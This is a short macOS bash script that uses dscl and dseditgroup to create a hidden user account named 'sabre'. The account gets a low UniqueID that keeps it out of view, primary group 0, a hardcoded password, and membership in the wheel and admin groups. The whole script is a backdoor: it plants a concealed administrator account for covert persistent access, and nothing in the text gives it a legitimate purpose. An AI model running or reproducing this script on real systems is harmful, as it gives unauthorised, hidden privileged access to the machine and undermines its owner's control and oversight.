#!/bin/bash
dscl . create /Users/sabre IsHidden 1
dscl . create /Users/sabre UniqueID 400
dscl . create /Users/sabre PrimaryGroupID 0
dscl . create /Users/sabre RealName Sabre
dscl . passwd /Users/sabre linux
dseditgroup -o edit -a sabre -t user wheel
dseditgroup -o edit -a sabre -t user admin
